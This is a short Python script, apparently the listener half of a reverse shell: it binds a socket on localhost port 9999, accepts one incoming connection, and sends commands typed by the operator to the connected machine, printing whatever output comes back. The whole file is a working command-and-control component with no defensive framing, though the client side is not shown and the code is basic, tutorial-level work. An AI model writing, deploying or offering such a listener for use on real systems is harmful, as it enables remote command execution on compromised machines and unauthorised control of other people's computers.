import socket
import sys

def socket_layer():
	try:
		global host
		global port
		global s 

		host = "127.0.0.1"

		port = 9999
		s = socket.socket()

	except socket.error as msg:
		print("Socket Error: " + str(msg))

def socket_bind():

	try:

		global host
		global port
		global s
		print("Binding to port " + str(port))
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg :
		print("Connection Failure: " + str(msg))

		print("Will attempt again...")

		socket_bind()


def socket_acception():
	conn, addr = s.accept()
	print("Connection has been accepted.. " + "IP: " + addr[0] + "Port: " + str(addr[1]))
	send_commands(conn)
	conn.close()


def send_commands(conn):
	while True:
		cmd = input()
		if cmd == "quit":
			s.close()
			sys.exit()

		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(3000), "utf-8")
			print(client_response, end = "")

def main():
	socket_layer()
	socket_bind()
	socket_acception()

main()